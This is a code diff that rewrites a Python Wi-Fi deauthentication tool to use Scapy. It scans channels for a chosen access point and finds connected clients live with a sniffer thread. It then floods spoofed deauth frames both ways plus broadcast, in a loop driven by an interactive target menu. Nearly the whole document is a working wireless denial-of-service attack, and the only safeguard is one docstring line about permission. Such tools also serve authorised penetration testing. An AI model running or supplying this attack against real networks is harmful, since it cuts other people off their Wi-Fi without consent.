@@ -1,143 +1,213 @@
 #!/usr/bin/env python3
 """
-Deauthentication module — send 802.11 deauth frames via aireplay-ng.
+Deauthentication module — 802.11 deauth via Scapy.
+Sends frames in both directions (AP→client and client→AP).
+Discovers new clients live while attacking.
 Use only on networks you own or have explicit permission to test.
 """
 
 import subprocess
 import signal
 import time
-import re
 import sys
-from wifi_monitor import (scan_wifi, find_wifi_interface, enable_monitor_mode,
+import threading
+import re
+import os
+from wifi_monitor import (find_wifi_interface, enable_monitor_mode,
                            disable_monitor_mode, get_monitor_interfaces,
                            _verify_monitor_mode)
 
 
-def check_aireplay():
-    """Check if aireplay-ng is available."""
+def _check_scapy():
     try:
-        subprocess.run(["aireplay-ng", "--help"],
-                       capture_output=True, timeout=5)
+        from scapy.all import Dot11
         return True
-    except FileNotFoundError:
-        print("[!] aireplay-ng not found. Install: sudo apt install aircrack-ng")
+    except ImportError:
         return False
 
 
-def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, channel=None):
-    """
-    Send deauth frames.
-    - bssid: target AP MAC
-    - client_mac: specific client, or None to broadcast (kick everyone)
-    - count: number of deauth packets (0 = continuous)
-    - continuous: keep sending until Ctrl+C
-    - channel: AP channel to tune interface before attack
-    """
-    # tune interface to AP channel first
-    if channel:
-        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
-                       capture_output=True, timeout=5)
-        print(f"[*] Tuned {mon_iface} to channel {channel}")
+def _set_channel(iface, channel):
+    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
+                   capture_output=True, timeout=5)
 
-    cmd = ["aireplay-ng",
-           "--deauth", "0" if continuous else str(count),
-           "-a", bssid]
 
-    if client_mac:
-        cmd += ["-c", client_mac]
-
-    cmd.append(mon_iface)
-
-    target = client_mac if client_mac else "broadcast (all clients)"
-    print(f"[*] Deauth flood → {bssid}  target: {target}  [Ctrl+C to stop]")
-
-    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
-                            stderr=subprocess.STDOUT, text=True)
-
-    frames_sent = 0
+def _get_supported_channels(iface):
+    """Get list of supported 2.4GHz channels for interface."""
     try:
-        for line in proc.stdout:
-            line = line.strip()
-            if not line:
-                continue
-            if "Sending DeAuth" in line or "Sending DeAuthentication" in line:
-                frames_sent += 1
-                print(f"\r[*] Frames: {frames_sent}", end="", flush=True)
-            elif "Waiting for beacon" in line:
-                print(f"    {line}")
-            elif "more effective" in line or "connected wireless" in line:
-                pass
-            else:
-                print(f"    {line}")
-        proc.wait()
-    except KeyboardInterrupt:
-        proc.send_signal(signal.SIGINT)
-        try:
-            proc.wait(timeout=3)
-        except Exception:
-            proc.kill()
-
-    print(f"\n[+] Done. Sent {frames_sent} deauth frames")
-    return frames_sent
+        r = subprocess.run(["iwlist", iface, "channel"],
+                           capture_output=True, text=True, timeout=5)
+        channels = re.findall(r"Channel (\d+)\s*:", r.stdout)
+        # 2.4GHz only (1-14)
+        return [int(c) for c in channels if 1 <= int(c) <= 14] or list(range(1, 14))
+    except Exception:
+        return list(range(1, 14))
 
 
-def flood_deauth(mon_iface, bssid, channel, clients=None):
+def scan_for_ap(iface, target_ssid=None, target_bssid=None, timeout_per_ch=2):
     """
-    Flood deauth: 3 parallel aireplay-ng processes for maximum effect.
-    - 1 broadcast process
-    - 1 process per known client (up to 2)
-    Press Ctrl+C to stop all.
+    Scan all channels for target AP.
+    Returns dict with bssid, ssid, channel or None.
     """
-    if channel:
-        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
-                       capture_output=True, timeout=5)
-        print(f"[*] Channel {channel}")
+    try:
+        from scapy.all import sniff, Dot11Beacon, Dot11ProbeResp, Dot11Elt
+    except ImportError:
+        print("[!] Scapy not found. Install: sudo pip3 install scapy")
+        return None
 
-    procs = []
+    channels = _get_supported_channels(iface)
+    found = {}
 
-    # broadcast process
-    cmd_bc = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
-    procs.append(subprocess.Popen(cmd_bc, stdout=subprocess.DEVNULL,
-                                   stderr=subprocess.DEVNULL))
+    def pkt_handler(pkt):
+        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+            bssid = pkt[0].addr2
+            if not bssid:
+                return
+            ssid = ""
+            if pkt.haslayer(Dot11Elt):
+                try:
+                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
+                except Exception:
+                    pass
+            ch = 0
+            elt = pkt[Dot11Elt]
+            while elt:
+                if elt.ID == 3:
+                    try:
+                        ch = ord(elt.info)
+                    except Exception:
+                        pass
+                    break
+                elt = elt.payload if hasattr(elt, "payload") else None
+            found[bssid] = {"bssid": bssid, "ssid": ssid, "channel": ch}
 
-    # per-client processes (up to 2 known clients)
-    for c in (clients or [])[:2]:
-        cmd_c = ["aireplay-ng", "--deauth", "0", "-a", bssid,
-                 "-c", c["mac"], mon_iface]
-        procs.append(subprocess.Popen(cmd_c, stdout=subprocess.DEVNULL,
-                                       stderr=subprocess.DEVNULL))
+    print(f"[*] Scanning channels for target...")
+    for ch in channels:
+        _set_channel(iface, ch)
+        sniff(iface=iface, prn=pkt_handler, timeout=timeout_per_ch,
+              store=False, monitor=True)
 
-    n = len(procs)
-    print(f"[*] Running {n} deauth stream(s) → {bssid}  [Ctrl+C to stop]")
+        # check if we found the target
+        for bssid, info in found.items():
+            if target_bssid and bssid.lower() == target_bssid.lower():
+                print(f"[+] Found {info['ssid']} on ch{info['channel']}")
+                return info
+            if target_ssid and info["ssid"] == target_ssid:
+                print(f"[+] Found {info['ssid']} ({bssid}) on ch{info['channel']}")
+                return info
 
-    frames = 0
+    return None
+
+
+def flood_deauth(iface, bssid, channel, ssid=""):
+    """
+    Flood deauth using Scapy:
+    - Sends AP→client AND client→AP frames for each known client
+    - Broadcasts to ff:ff:ff:ff:ff:ff every round
+    - Discovers new clients live via sniffer thread
+    - Press Ctrl+C to stop
+    """
+    try:
+        from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp,
+                                sniff, Dot11AssoResp, Dot11ReassoResp, Dot11QoS)
+    except ImportError:
+        print("[!] Scapy not found. Install: sudo pip3 install scapy")
+        return
+
+    _set_channel(iface, channel)
+    print(f"[*] Channel {channel}")
+
+    clients = set()
+    clients_lock = threading.Lock()
+    stop_event = threading.Event()
+    frames_sent = 0
+
+    def make_deauth(src, dst, bssid_addr):
+        return (RadioTap() /
+                Dot11(addr1=dst, addr2=src, addr3=bssid_addr) /
+                Dot11Deauth(reason=7))
+
+    def send_to_client(client_mac):
+        nonlocal frames_sent
+        # AP → client
+        sendp(make_deauth(bssid, client_mac, bssid),
+              iface=iface, verbose=False)
+        # client → AP
+        sendp(make_deauth(client_mac, bssid, bssid),
+              iface=iface, verbose=False)
+        frames_sent += 2
+
+    def send_broadcast():
+        nonlocal frames_sent
+        sendp(make_deauth(bssid, "ff:ff:ff:ff:ff:ff", bssid),
+              iface=iface, verbose=False)
+        frames_sent += 1
+
+    def client_sniffer():
+        """Passively discover associated clients."""
+        def handler(pkt):
+            if stop_event.is_set():
+                return
+            mac = None
+            if pkt.haslayer(Dot11AssoResp):
+                if pkt[Dot11AssoResp].status == 0:
+                    mac = pkt[0].addr1
+            elif pkt.haslayer(Dot11ReassoResp):
+                if pkt[Dot11ReassoResp].status == 0:
+                    mac = pkt[0].addr1
+            elif pkt.haslayer(Dot11QoS):
+                # data frame: check it's going to/from our AP
+                if pkt[0].addr3 and pkt[0].addr3.lower() == bssid.lower():
+                    candidate = pkt[0].addr1
+                    if (candidate and
+                            candidate.lower() != "ff:ff:ff:ff:ff:ff" and
+                            candidate.lower() != bssid.lower()):
+                        mac = candidate
+
+            if mac and mac.lower() != "ff:ff:ff:ff:ff:ff":
+                with clients_lock:
+                    if mac not in clients:
+                        clients.add(mac)
+                        print(f"\n[+] New client: {mac}")
+
+        sniff(iface=iface, prn=handler, store=False,
+              stop_filter=lambda p: stop_event.is_set(), monitor=True)
+
+    # start client sniffer in background
+    sniffer_thread = threading.Thread(target=client_sniffer, daemon=True)
+    sniffer_thread.start()
+
+    label = ssid if ssid else bssid
+    print(f"[*] Flooding deauth → {label}  [Ctrl+C to stop]")
+    print(f"[*] Clients discovered live, broadcast every round")
+
     try:
         while True:
-            time.sleep(0.5)
-            frames += 1
-            print(f"\r[*] Running... {frames}s", end="", flush=True)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        for p in procs:
-            try:
-                p.send_signal(signal.SIGINT)
-                p.wait(timeout=2)
-            except Exception:
-                p.kill()
+            # broadcast
+            send_broadcast()
 
-    print(f"\n[+] Stopped after {frames}s")
+            # per-client (both directions)
+            with clients_lock:
+                current_clients = set(clients)
+            for mac in current_clients:
+                send_to_client(mac)
+
+            elapsed = getattr(flood_deauth, "_start", time.time())
+            print(f"\r[*] Frames: {frames_sent}  Clients known: {len(current_clients)}",
+                  end="", flush=True)
+            time.sleep(0.1)
+
+    except KeyboardInterrupt:
+        stop_event.set()
+        print(f"\n[+] Stopped. Sent {frames_sent} deauth frames, "
+              f"{len(clients)} clients targeted")
 
 
 def deauth_menu(aps, clients, mon_iface):
-    """Interactive deauth menu given scan results."""
-
+    """Interactive deauth: pick network, flood starts immediately."""
     if not aps:
-        print("[!] No networks found. Run Wi-Fi scan first.")
+        print("[!] No networks found.")
         return
 
-    # show APs
     print(f"\n{'='*70}")
     print(f" Select target network")
     print(f"{'='*70}")
@@ -145,20 +215,17 @@ def deauth_menu(aps, clients, mon_iface):
     print(f" {'-'*2:<4}{'-'*26:<28}{'-'*17:<20}{'-'*3:<5}{'-'*10:<12}{'-'*8}")
     for i, ap in enumerate(aps, 1):
         essid = ap["essid"][:26] if ap["essid"] else "<hidden>"
-        # show client count if any
         ap_client_count = len([c for c in clients if c["bssid"] == ap["bssid"]])
         clients_str = f"  [{ap_client_count} clients]" if ap_client_count else ""
         print(f" {i:<4}{essid:<28}{ap['bssid']:<20}{ap['channel']:<5}"
               f"{ap['encryption']:<12}{ap['power']} dBm{clients_str}")
     print(f" {'='*70}")
-    print(" Enter number to deauth all clients, or q to cancel:")
-    print(" (if clients visible — append client number, e.g. '2c1' = network 2, client 1)")
+    print(" Number to flood all, 'Nc1' for specific client, q to cancel:")
 
     choice = input("    > ").strip()
     if choice.lower() == "q":
         return
 
-    # parse "2c1" style (network + client)
     client_mac = None
     m = re.match(r"(\d+)c(\d+)", choice)
     if m:
@@ -172,7 +239,8 @@ def deauth_menu(aps, clients, mon_iface):
         try:
             client_mac = ap_clients[cli_num - 1]["mac"]
         except IndexError:
-            print("[!] Invalid client number, using broadcast")
+            print("[!] Invalid client number")
+            return
     else:
         try:
             ap = aps[int(choice) - 1]
@@ -182,23 +250,52 @@ def deauth_menu(aps, clients, mon_iface):
 
     bssid = ap["bssid"]
     essid = ap["essid"] or "<hidden>"
-    ap_clients = [c for c in clients if c["bssid"] == bssid]
+    channel = ap.get("channel", 6)
 
     if client_mac:
+        # single client — use simple send_deauth loop
         print(f"\n[!] Deauth {essid} → {client_mac}  [Ctrl+C to stop]")
-        send_deauth(mon_iface, bssid, client_mac, count=0, continuous=True,
-                    channel=ap.get("channel"))
+        _single_client_flood(mon_iface, bssid, client_mac, channel)
     else:
-        print(f"\n[!] Flood deauth {essid} ({bssid})  [Ctrl+C to stop]")
-        flood_deauth(mon_iface, bssid, ap.get("channel"), ap_clients)
+        print(f"\n[!] Flood deauth: {essid} ({bssid})")
+        flood_deauth(mon_iface, bssid, channel, essid)
+
+
+def _single_client_flood(iface, bssid, client_mac, channel):
+    """Targeted flood at a single client (both directions)."""
+    try:
+        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+    except ImportError:
+        print("[!] Scapy not found. Install: sudo pip3 install scapy")
+        return
+
+    _set_channel(iface, channel)
+
+    def make_deauth(src, dst):
+        return (RadioTap() /
+                Dot11(addr1=dst, addr2=src, addr3=bssid) /
+                Dot11Deauth(reason=7))
+
+    frames = 0
+    print(f"[*] Targeting {client_mac}  [Ctrl+C to stop]")
+    try:
+        while True:
+            sendp(make_deauth(bssid, client_mac), iface=iface, verbose=False)
+            sendp(make_deauth(client_mac, bssid), iface=iface, verbose=False)
+            frames += 2
+            print(f"\r[*] Frames: {frames}", end="", flush=True)
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print(f"\n[+] Stopped. Sent {frames} frames")
 
 
 def interactive_deauth():
-    """Full interactive deauth flow: scan → select → deauth."""
-    if not check_aireplay():
+    """Full interactive deauth flow."""
+    if not _check_scapy():
+        print("[!] Scapy not found. Install: sudo pip3 install scapy")
         return
 
-    # check for existing monitor interface
+    # get monitor interface
     mon_interfaces = get_monitor_interfaces()
     mon_iface = None
     need_disable = False
@@ -211,8 +308,6 @@ def interactive_deauth():
         if not iface:
             print("[!] No Wi-Fi adapter found")
             return
-
-        print(f"[*] Found adapter: {iface}")
         mon_iface = enable_monitor_mode(iface)
         need_disable = True
 
@@ -220,24 +315,23 @@ def interactive_deauth():
         print(f"[!] {mon_iface} is not in monitor mode")
         return
 
+    # scan
     print(f"\n[*] Scanning for 15s to find targets...")
-
     from wifi_monitor import run_airodump, parse_airodump_csv, print_wifi_results
     csv_path = run_airodump(mon_iface, 15)
     aps, clients = parse_airodump_csv(csv_path)
 
     if not aps:
-        print("[!] No networks found during scan")
+        print("[!] No networks found")
         if need_disable:
             disable_monitor_mode(mon_iface)
         return
 
     print_wifi_results(aps, clients)
 
-    # deauth loop — allow multiple attacks
     while True:
         deauth_menu(aps, clients, mon_iface)
-        print("\n[?] Deauth another target? (y/n)")
+        print("\n[?] Attack another? (y/n)")
         if input("    > ").strip().lower() != "y":
             break
 
